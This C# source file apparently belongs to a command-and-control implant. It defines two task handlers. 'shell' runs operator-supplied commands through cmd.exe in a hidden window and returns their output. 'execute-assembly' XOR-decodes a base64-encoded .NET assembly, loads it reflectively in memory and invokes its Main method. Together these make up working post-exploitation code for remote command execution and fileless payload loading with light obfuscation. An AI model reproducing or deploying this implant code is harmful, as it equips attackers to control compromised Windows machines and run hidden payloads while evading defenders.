using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Permissions;
using System.Security;

namespace Execution
{
    public class Shell
    {
        public string Name => "shell";
        public dynamic DotsProperty { get; set; }

        public string Execute(dynamic task)
        {
            var results = "";

            var startInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = $"/c {string.Join(" ", task.Params)}",
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            var process = Process.Start(startInfo);

            using (process.StandardOutput)
            {
                results += process.StandardOutput.ReadToEnd();
            }

            using (process.StandardError)
            {
                results += process.StandardError.ReadToEnd();
            }

            return results;
        }
    }

    public class ExecuteAssembly
    {
        public string Name => "execute-assembly";
        public dynamic DotsProperty { get; set; }

        public string Execute(dynamic task)
        {
            try
            {
                byte[] assemblyBytes = Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]);
                Assembly assembly = Assembly.Load(assemblyBytes);
                foreach (Type type in assembly.GetExportedTypes())
                {
                    MethodInfo mainMethod = type.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);

                    if (mainMethod != null)
                    {
                        // Redirect output
                        var consoleWriter = new StringWriter();
                        Console.SetOut(consoleWriter);

                        // Invoke the Main method
                        mainMethod.Invoke(null, new object[] { SliceArray(task.Params, 2, task.Params.Length - 1) });

                        // Restore output
                        Console.SetOut(new StreamWriter(Console.OpenStandardOutput())); // Restore the original output

                        // Get the captured output
                        return consoleWriter.ToString();
                    }
                }
                return "Main method not found";
            }
            catch (Exception ex)
            {
                return ex.ToString();
            }

        }
        private string[] SliceArray(string[] inputArray, int startIndex, int endIndex)
        {
            int length = endIndex - startIndex + 1;
            string[] outputArray = new string[length];
            Array.Copy(inputArray, startIndex, outputArray, 0, length);
            return outputArray;
        }

        private byte[] Zor(byte[] input, string key)
        {
            int _key = Int32.Parse(key);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ _key);
            }
            return mixed;
        }
    }
}